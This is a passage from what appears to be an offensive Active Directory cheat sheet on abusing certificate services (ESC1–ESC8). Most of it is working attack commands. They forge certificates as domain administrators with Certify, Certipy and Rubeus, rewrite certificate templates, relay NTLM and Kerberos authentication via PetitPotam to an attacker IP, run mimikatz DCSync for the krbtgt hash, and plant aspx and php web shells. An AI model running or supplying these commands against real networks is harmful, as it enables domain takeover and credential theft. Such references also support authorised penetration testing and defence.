<a id="__codelineno-186-4" name="__codelineno-186-4" href="#__codelineno-186-4"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Get-ADObject</span> <span class="n">-LDAPFilter</span> <span class="s1">&#39;(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))&#39;</span> <span class="n">-SearchBase</span> <span class="s1">&#39;CN=Configuration,DC=lab,DC=local&#39;</span>
<a id="__codelineno-186-5" name="__codelineno-186-5" href="#__codelineno-186-5"></a><span class="c"># or</span>
<a id="__codelineno-186-6" name="__codelineno-186-6" href="#__codelineno-186-6"></a><span class="n">certipy</span> <span class="s1">&#39;domain.local&#39;</span><span class="p">/</span><span class="s1">&#39;user&#39;</span><span class="p">:</span><span class="s1">&#39;password&#39;</span><span class="p">@</span><span class="s1">&#39;domaincontroller&#39;</span> <span class="n">find</span> <span class="n">-bloodhound</span>
</code></pre></div>
* Use Certify, <a href="https://github.com/eloypgz/certi">Certi</a> or <a href="https://github.com/ly4k/Certipy">Certipy</a> to request a Certificate and add an alternative name (user to impersonate)
    <div class="highlight"><pre><span></span><code><a id="__codelineno-187-1" name="__codelineno-187-1" href="#__codelineno-187-1"></a><span class="c"># request certificates for the machine account by executing Certify with the &quot;/machine&quot; argument from an elevated command prompt.</span>
<a id="__codelineno-187-2" name="__codelineno-187-2" href="#__codelineno-187-2"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">dc</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">domain-DC-CA</span> <span class="p">/</span><span class="n">template</span><span class="p">:</span><span class="n">VulnTemplate</span> <span class="p">/</span><span class="n">altname</span><span class="p">:</span><span class="n">domadmin</span>
<a id="__codelineno-187-3" name="__codelineno-187-3" href="#__codelineno-187-3"></a><span class="n">certi</span><span class="p">.</span><span class="n">py</span> <span class="n">req</span> <span class="s1">&#39;contoso.local/Anakin@dc01.contoso.local&#39;</span> <span class="n">contoso-DC01-CA</span> <span class="n">-k</span> <span class="n">-n</span> <span class="p">-</span><span class="n">-alt-name</span> <span class="n">han</span> <span class="p">-</span><span class="n">-template</span> <span class="n">UserSAN</span>
<a id="__codelineno-187-4" name="__codelineno-187-4" href="#__codelineno-187-4"></a><span class="n">certipy</span> <span class="n">req</span> <span class="s1">&#39;corp.local/john:Passw0rd!@ca.corp.local&#39;</span> <span class="n">-ca</span> <span class="s1">&#39;corp-CA&#39;</span> <span class="n">-template</span> <span class="s1">&#39;ESC1&#39;</span> <span class="n">-alt</span> <span class="s1">&#39;administrator@corp.local&#39;</span>
</code></pre></div>
* Use OpenSSL and convert the certificate, do not enter a password
    <div class="highlight"><pre><span></span><code><a id="__codelineno-188-1" name="__codelineno-188-1" href="#__codelineno-188-1"></a><span class="n">openssl</span> <span class="n">pkcs12</span> <span class="n">-in</span> <span class="n">cert</span><span class="p">.</span><span class="n">pem</span> <span class="n">-keyex</span> <span class="n">-CSP</span> <span class="s2">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> <span class="n">-export</span> <span class="n">-out</span> <span class="n">cert</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>
* Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus
    <div class="highlight"><pre><span></span><code><a id="__codelineno-189-1" name="__codelineno-189-1" href="#__codelineno-189-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">domadmin</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">Temp</span><span class="p">\</span><span class="n">cert</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div></p>
<p><strong>WARNING</strong>: These certificates will still be usable even if the user or computer resets their password!</p>
<p><strong>NOTE</strong>: Look for <strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong>, <strong>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</strong>, <strong>ManageCA</strong> flags, and NTLM Relay to AD CS HTTP Endpoints.</p>
<h3 id="esc2-misconfigured-certificate-templates">ESC2 - Misconfigured Certificate Templates</h3>
<p>Requirements:
*  Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)</p>
<p>Exploitation:
* Find template
  <div class="highlight"><pre><span></span><code><a id="__codelineno-190-1" name="__codelineno-190-1" href="#__codelineno-190-1"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Get-ADObject</span> <span class="n">-LDAPFilter</span> <span class="s1">&#39;(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))&#39;</span> <span class="n">-SearchBase</span> <span class="s1">&#39;CN=Configuration,DC=megacorp,DC=local&#39;</span>
</code></pre></div>
* Request a certificate specifying the <code>/altname</code> as a domain admin like in <a href="#esc1---misconfigured-certificate-templates">ESC1</a>.</p>
<h3 id="esc3-misconfigured-enrollment-agent-templates">ESC3 - Misconfigured Enrollment Agent Templates</h3>
<blockquote>
<p>ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users</p>
</blockquote>
<ul>
<li>Request a certificate based on the vulnerable certificate template ESC3.
  <div class="highlight"><pre><span></span><code><a id="__codelineno-191-1" name="__codelineno-191-1" href="#__codelineno-191-1"></a><span class="p">$</span> <span class="n">certipy</span> <span class="n">req</span> <span class="s1">&#39;corp.local/john:Passw0rd!@ca.corp.local&#39;</span> <span class="n">-ca</span> <span class="s1">&#39;corp-CA&#39;</span> <span class="n">-template</span> <span class="s1">&#39;ESC3&#39;</span>
<a id="__codelineno-191-2" name="__codelineno-191-2" href="#__codelineno-191-2"></a><span class="p">[*]</span> <span class="n">Saved</span> <span class="n">certificate</span> <span class="n">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">&#39;john.pfx&#39;</span>
</code></pre></div></li>
<li>Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-192-1" name="__codelineno-192-1" href="#__codelineno-192-1"></a><span class="p">$</span> <span class="n">certipy</span> <span class="n">req</span> <span class="s1">&#39;corp.local/john:Passw0rd!@ca.corp.local&#39;</span> <span class="n">-ca</span> <span class="s1">&#39;corp-CA&#39;</span> <span class="n">-template</span> <span class="s1">&#39;User&#39;</span> <span class="n">-on-behalf-of</span> <span class="s1">&#39;corp\administrator&#39;</span> <span class="n">-pfx</span> <span class="s1">&#39;john.pfx&#39;</span>
</code></pre></div></li>
</ul>
<h3 id="esc4-access-control-vulnerabilities">ESC4 - Access Control Vulnerabilities</h3>
<blockquote>
<p>Enabling the <code>mspki-certificate-name-flag</code> flag for a template that allows for domain authentication, allow attackers to "push a misconfiguration to a template leading to ESC1 vulnerability</p>
</blockquote>
<ul>
<li>Search for <code>WriteProperty</code> with value <code>00000000-0000-0000-0000-000000000000</code> using <a href="https://github.com/fortalice/modifyCertTemplate">modifyCertTemplate</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-193-1" name="__codelineno-193-1" href="#__codelineno-193-1"></a><span class="n">python3</span> <span class="n">modifyCertTemplate</span><span class="p">.</span><span class="n">py</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">user</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-template</span> <span class="n">user</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-get-acl</span>
</code></pre></div></li>
<li>Add the <code>ENROLLEE_SUPPLIES_SUBJECT</code> (ESS) flag to perform ESC1
  <div class="highlight"><pre><span></span><code><a id="__codelineno-194-1" name="__codelineno-194-1" href="#__codelineno-194-1"></a><span class="n">python3</span> <span class="n">modifyCertTemplate</span><span class="p">.</span><span class="n">py</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">user</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-template</span> <span class="n">user</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-add</span> <span class="n">enrollee_supplies_subject</span> <span class="n">-property</span> <span class="n">mspki-Certificate-Name-Flag</span>
<a id="__codelineno-194-2" name="__codelineno-194-2" href="#__codelineno-194-2"></a>
<a id="__codelineno-194-3" name="__codelineno-194-3" href="#__codelineno-194-3"></a><span class="c"># Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. </span>
<a id="__codelineno-194-4" name="__codelineno-194-4" href="#__codelineno-194-4"></a><span class="n">C</span><span class="p">:\&gt;</span><span class="n">StandIn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-adcs</span> <span class="p">-</span><span class="n">-filter</span> <span class="n">WebServer</span> <span class="p">-</span><span class="n">-ess</span> <span class="p">-</span><span class="n">-add</span>
</code></pre></div></li>
<li>Perform ESC1 and then restore the value
  <div class="highlight"><pre><span></span><code><a id="__codelineno-195-1" name="__codelineno-195-1" href="#__codelineno-195-1"></a><span class="n">python3</span> <span class="n">modifyCertTemplate</span><span class="p">.</span><span class="n">py</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">user</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-template</span> <span class="n">user</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-value</span> <span class="n">0</span> <span class="n">-property</span> <span class="n">mspki-Certificate-Name-Flag</span>
</code></pre></div></li>
</ul>
<p>Using Certipy</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-196-1" name="__codelineno-196-1" href="#__codelineno-196-1"></a><span class="c"># overwrite the configuration to make it vulnerable to ESC1</span>
<a id="__codelineno-196-2" name="__codelineno-196-2" href="#__codelineno-196-2"></a><span class="n">certipy</span> <span class="n">template</span> <span class="s1">&#39;corp.local/johnpc$@ca.corp.local&#39;</span> <span class="n">-hashes</span> <span class="p">:</span><span class="n">fc525c9683e8fe067095ba2ddc971889</span> <span class="n">-template</span> <span class="s1">&#39;ESC4&#39;</span> <span class="n">-save-old</span>
<a id="__codelineno-196-3" name="__codelineno-196-3" href="#__codelineno-196-3"></a><span class="c"># request a certificate based on the ESC4 template, just like ESC1.</span>
<a id="__codelineno-196-4" name="__codelineno-196-4" href="#__codelineno-196-4"></a><span class="n">certipy</span> <span class="n">req</span> <span class="s1">&#39;corp.local/john:Passw0rd!@ca.corp.local&#39;</span> <span class="n">-ca</span> <span class="s1">&#39;corp-CA&#39;</span> <span class="n">-template</span> <span class="s1">&#39;ESC4&#39;</span> <span class="n">-alt</span> <span class="s1">&#39;administrator@corp.local&#39;</span>
<a id="__codelineno-196-5" name="__codelineno-196-5" href="#__codelineno-196-5"></a><span class="c"># restore the old configuration</span>
<a id="__codelineno-196-6" name="__codelineno-196-6" href="#__codelineno-196-6"></a><span class="n">certipy</span> <span class="n">template</span> <span class="s1">&#39;corp.local/johnpc$@ca.corp.local&#39;</span> <span class="n">-hashes</span> <span class="p">:</span><span class="n">fc525c9683e8fe067095ba2ddc971889</span> <span class="n">-template</span> <span class="s1">&#39;ESC4&#39;</span> <span class="n">-configuration</span> <span class="n">ESC4</span><span class="p">.</span><span class="n">json</span>
</code></pre></div>
<h3 id="esc6-editf_attributesubjectaltname2">ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2</h3>
<blockquote>
<p>If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name. </p>
</blockquote>
<p>Exploitation:
* Use <a href="https://github.com/GhostPack/Certify">Certify.exe</a> to check for <strong>UserSpecifiedSAN</strong> flag state which refers to the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-197-1" name="__codelineno-197-1" href="#__codelineno-197-1"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">cas</span>
</code></pre></div>
* Request a certificate for a template and add an altname, even though the default <code>User</code> template doesn't normally allow to specify alternative names
    <div class="highlight"><pre><span></span><code><a id="__codelineno-198-1" name="__codelineno-198-1" href="#__codelineno-198-1"></a><span class="p">.\</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">dc</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">domain-DC-CA</span> <span class="p">/</span><span class="n">template</span><span class="p">:</span><span class="n">User</span> <span class="p">/</span><span class="n">altname</span><span class="p">:</span><span class="n">DomAdmin</span>
</code></pre></div></p>
<p>Mitigation: <br />
* Remove the flag : <code>certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2</code></p>
<h3 id="esc7-vulnerable-certificate-authority-access-control">ESC7 - Vulnerable Certificate Authority Access Control</h3>
<p>Exploitation:
* Detect CAs that allow low privileged users the <code>ManageCA</code>  or <code>Manage Certificates</code> permissions
    <div class="highlight"><pre><span></span><code><a id="__codelineno-199-1" name="__codelineno-199-1" href="#__codelineno-199-1"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">find</span> <span class="p">/</span><span class="n">vulnerable</span>
</code></pre></div>
* Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6)
    <div class="highlight"><pre><span></span><code><a id="__codelineno-200-1" name="__codelineno-200-1" href="#__codelineno-200-1"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">setconfig</span> <span class="p">/</span><span class="n">enablesan</span> <span class="p">/</span><span class="n">restart</span>
</code></pre></div>
* Request the certificate with the desired SAN.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-201-1" name="__codelineno-201-1" href="#__codelineno-201-1"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">template</span><span class="p">:</span><span class="n">User</span> <span class="p">/</span><span class="n">altname</span><span class="p">:</span><span class="n">super</span><span class="p">.</span><span class="n">adm</span>
</code></pre></div>
* Grant approval if required or disable the approval requirement
    <div class="highlight"><pre><span></span><code><a id="__codelineno-202-1" name="__codelineno-202-1" href="#__codelineno-202-1"></a><span class="c"># Grant</span>
<a id="__codelineno-202-2" name="__codelineno-202-2" href="#__codelineno-202-2"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">issue</span> <span class="p">/</span><span class="n">id</span><span class="p">:</span><span class="no">[REQUEST ID]</span>
<a id="__codelineno-202-3" name="__codelineno-202-3" href="#__codelineno-202-3"></a><span class="c"># Disable</span>
<a id="__codelineno-202-4" name="__codelineno-202-4" href="#__codelineno-202-4"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">setconfig</span> <span class="p">/</span><span class="n">removeapproval</span> <span class="p">/</span><span class="n">restart</span>
</code></pre></div></p>
<p>Alternative exploitation from <strong>ManageCA</strong> to <strong>RCE</strong> on ADCS server: </p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-203-1" name="__codelineno-203-1" href="#__codelineno-203-1"></a><span class="c"># Get the current CDP list. Useful to find remote writable shares:</span>
<a id="__codelineno-203-2" name="__codelineno-203-2" href="#__codelineno-203-2"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">writefile</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">SERVER</span><span class="p">\</span><span class="n">ca-name</span> <span class="p">/</span><span class="n">readonly</span>
<a id="__codelineno-203-3" name="__codelineno-203-3" href="#__codelineno-203-3"></a>
<a id="__codelineno-203-4" name="__codelineno-203-4" href="#__codelineno-203-4"></a><span class="c"># Write an aspx shell to a local web directory:</span>
<a id="__codelineno-203-5" name="__codelineno-203-5" href="#__codelineno-203-5"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">writefile</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">SERVER</span><span class="p">\</span><span class="n">ca-name</span> <span class="p">/</span><span class="n">path</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">SystemData</span><span class="p">\</span><span class="n">CES</span><span class="p">\</span><span class="n">CA-Name</span><span class="p">\</span><span class="n">shell</span><span class="p">.</span><span class="n">aspx</span> <span class="p">/</span><span class="n">input</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">Local</span><span class="p">\</span><span class="n">Path</span><span class="p">\</span><span class="n">shell</span><span class="p">.</span><span class="n">aspx</span>
<a id="__codelineno-203-6" name="__codelineno-203-6" href="#__codelineno-203-6"></a>
<a id="__codelineno-203-7" name="__codelineno-203-7" href="#__codelineno-203-7"></a><span class="c"># Write the default asp shell to a local web directory:</span>
<a id="__codelineno-203-8" name="__codelineno-203-8" href="#__codelineno-203-8"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">writefile</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">SERVER</span><span class="p">\</span><span class="n">ca-name</span> <span class="p">/</span><span class="n">path</span><span class="p">:</span><span class="n">c</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">wwwroot</span><span class="p">\</span><span class="n">shell</span><span class="p">.</span><span class="n">asp</span>
<a id="__codelineno-203-9" name="__codelineno-203-9" href="#__codelineno-203-9"></a>
<a id="__codelineno-203-10" name="__codelineno-203-10" href="#__codelineno-203-10"></a><span class="c"># Write a php shell to a remote web directory:</span>
<a id="__codelineno-203-11" name="__codelineno-203-11" href="#__codelineno-203-11"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">writefile</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">SERVER</span><span class="p">\</span><span class="n">ca-name</span> <span class="p">/</span><span class="n">path</span><span class="p">:\\</span><span class="n">remote</span><span class="p">.</span><span class="n">server</span><span class="p">\</span><span class="n">share</span><span class="p">\</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span> <span class="p">/</span><span class="n">input</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">Local</span><span class="p">\</span><span class="n">path</span><span class="p">\</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span>
</code></pre></div>
<h3 id="esc8-ad-cs-relay-attack">ESC8 - AD CS Relay Attack</h3>
<blockquote>
<p>An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.</p>
</blockquote>
<p>Require <a href="https://github.com/SecureAuthCorp/impacket/pull/1101">Impacket PR #1101</a></p>
<ul>
<li>
<p><strong>Version 1</strong>: NTLM Relay + Rubeus + PetitPotam
  <div class="highlight"><pre><span></span><code><a id="__codelineno-204-1" name="__codelineno-204-1" href="#__codelineno-204-1"></a><span class="n">impacket</span><span class="p">&gt;</span> <span class="n">python3</span> <span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ca-server</span><span class="p">&gt;/</span><span class="n">certsrv</span><span class="p">/</span><span class="n">certfnsh</span><span class="p">.</span><span class="n">asp</span> <span class="n">-smb2support</span> <span class="p">-</span><span class="n">-adcs</span>
<a id="__codelineno-204-2" name="__codelineno-204-2" href="#__codelineno-204-2"></a><span class="n">impacket</span><span class="p">&gt;</span> <span class="n">python3</span> <span class="p">./</span><span class="n">examples</span><span class="p">/</span><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">/</span><span class="n">certsrv</span><span class="p">/</span><span class="n">certfnsh</span><span class="p">.</span><span class="n">asp</span> <span class="n">-smb2support</span> <span class="p">-</span><span class="n">-adcs</span> <span class="p">-</span><span class="n">-template</span> <span class="n">VulnTemplate</span>
<a id="__codelineno-204-3" name="__codelineno-204-3" href="#__codelineno-204-3"></a><span class="c"># For a member server or workstation, the template would be &quot;Computer&quot;.</span>
<a id="__codelineno-204-4" name="__codelineno-204-4" href="#__codelineno-204-4"></a><span class="c"># Other templates: workstation, DomainController, Machine, KerberosAuthentication</span>
<a id="__codelineno-204-5" name="__codelineno-204-5" href="#__codelineno-204-5"></a>
<a id="__codelineno-204-6" name="__codelineno-204-6" href="#__codelineno-204-6"></a><span class="c"># Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam </span>
<a id="__codelineno-204-7" name="__codelineno-204-7" href="#__codelineno-204-7"></a><span class="c"># You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN</span>
<a id="__codelineno-204-8" name="__codelineno-204-8" href="#__codelineno-204-8"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">topotam</span><span class="p">/</span><span class="n">PetitPotam</span>
<a id="__codelineno-204-9" name="__codelineno-204-9" href="#__codelineno-204-9"></a><span class="n">python3</span> <span class="n">petitpotam</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="nv">$DOMAIN</span> <span class="n">-u</span> <span class="nv">$USER</span> <span class="n">-p</span> <span class="nv">$PASSWORD</span> <span class="nv">$ATTACKER_IP</span> <span class="nv">$TARGET_IP</span>
<a id="__codelineno-204-10" name="__codelineno-204-10" href="#__codelineno-204-10"></a><span class="n">python3</span> <span class="n">petitpotam</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="s1">&#39;&#39;</span> <span class="n">-u</span> <span class="s1">&#39;&#39;</span> <span class="n">-p</span> <span class="s1">&#39;&#39;</span> <span class="nv">$ATTACKER_IP</span> <span class="nv">$TARGET_IP</span>
<a id="__codelineno-204-11" name="__codelineno-204-11" href="#__codelineno-204-11"></a><span class="n">python3</span> <span class="n">dementor</span><span class="p">.</span><span class="n">py</span> <span class="p">&lt;</span><span class="n">listener</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">target</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;</span>
<a id="__codelineno-204-12" name="__codelineno-204-12" href="#__codelineno-204-12"></a><span class="n">python3</span> <span class="n">dementor</span><span class="p">.</span><span class="n">py</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">250</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">user1</span> <span class="n">-p</span> <span class="n">Password1</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-204-13" name="__codelineno-204-13" href="#__codelineno-204-13"></a>
<a id="__codelineno-204-14" name="__codelineno-204-14" href="#__codelineno-204-14"></a><span class="c"># Use the certificate with rubeus to request a TGT</span>
<a id="__codelineno-204-15" name="__codelineno-204-15" href="#__codelineno-204-15"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">user</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:&lt;</span><span class="n">base64-certificate</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ptt</span>
<a id="__codelineno-204-16" name="__codelineno-204-16" href="#__codelineno-204-16"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">dc1</span><span class="p">$</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">MIIRdQIBAzC</span><span class="p">...</span><span class="n">mUUXS</span> <span class="p">/</span><span class="n">ptt</span>
<a id="__codelineno-204-17" name="__codelineno-204-17" href="#__codelineno-204-17"></a>
<a id="__codelineno-204-18" name="__codelineno-204-18" href="#__codelineno-204-18"></a><span class="c"># Now you can use the TGT to perform a DCSync</span>
<a id="__codelineno-204-19" name="__codelineno-204-19" href="#__codelineno-204-19"></a><span class="n">mimikatz</span><span class="p">&gt;</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">krbtgt</span>
</code></pre></div></p>
</li>
<li>
<p><strong>Version 2</strong>: NTLM Relay + Mimikatz + Kekeo
  <div class="highlight"><pre><span></span><code><a id="__codelineno-205-1" name="__codelineno-205-1" href="#__codelineno-205-1"></a><span class="n">impacket</span><span class="p">&gt;</span> <span class="n">python3</span> <span class="p">./</span><span class="n">examples</span><span class="p">/</span><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">/</span><span class="n">certsrv</span><span class="p">/</span><span class="n">certfnsh</span><span class="p">.</span><span class="n">asp</span> <span class="n">-smb2support</span> <span class="p">-</span><span class="n">-adcs</span> <span class="p">-</span><span class="n">-template</span> <span class="n">DomainController</span>
<a id="__codelineno-205-2" name="__codelineno-205-2" href="#__codelineno-205-2"></a>
<a id="__codelineno-205-3" name="__codelineno-205-3" href="#__codelineno-205-3"></a><span class="c"># Mimikatz</span>
<a id="__codelineno-205-4" name="__codelineno-205-4" href="#__codelineno-205-4"></a><span class="n">mimikatz</span><span class="p">&gt;</span> <span class="n">misc</span><span class="p">::</span><span class="n">efs</span> <span class="p">/</span><span class="n">server</span><span class="p">:</span><span class="n">dc</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">connect</span><span class="p">:&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">noauth</span>
<a id="__codelineno-205-5" name="__codelineno-205-5" href="#__codelineno-205-5"></a>
<a id="__codelineno-205-6" name="__codelineno-205-6" href="#__codelineno-205-6"></a><span class="c"># Kekeo</span>
<a id="__codelineno-205-7" name="__codelineno-205-7" href="#__codelineno-205-7"></a><span class="n">kekeo</span><span class="p">&gt;</span> <span class="n">base64</span> <span class="p">/</span><span class="n">input</span><span class="p">:</span><span class="n">on</span>
<a id="__codelineno-205-8" name="__codelineno-205-8" href="#__codelineno-205-8"></a><span class="n">kekeo</span><span class="p">&gt;</span> <span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">pfx</span><span class="p">:&lt;</span><span class="n">BASE64-CERT-FROM-NTLMRELAY</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">dc</span><span class="p">$</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span>
<a id="__codelineno-205-9" name="__codelineno-205-9" href="#__codelineno-205-9"></a>
<a id="__codelineno-205-10" name="__codelineno-205-10" href="#__codelineno-205-10"></a><span class="c"># Mimikatz</span>
<a id="__codelineno-205-11" name="__codelineno-205-11" href="#__codelineno-205-11"></a><span class="n">mimikatz</span><span class="p">&gt;</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">krbtgt</span>
</code></pre></div></p>
</li>
<li>
<p><strong>Version 3</strong>: Kerberos Relay
  <div class="highlight"><pre><span></span><code><a id="__codelineno-206-1" name="__codelineno-206-1" href="#__codelineno-206-1"></a><span class="c"># Setup the relay</span>
<a id="__codelineno-206-2" name="__codelineno-206-2" href="#__codelineno-206-2"></a><span class="n">sudo</span> <span class="n">krbrelayx</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-target</span> <span class="n">http</span><span class="p">://</span><span class="n">CA</span><span class="p">/</span><span class="n">certsrv</span> <span class="n">-ip</span> <span class="n">attacker_IP</span> <span class="p">-</span><span class="n">-victim</span> <span class="n">target</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-adcs</span> <span class="p">-</span><span class="n">-template</span> <span class="n">Machine</span>
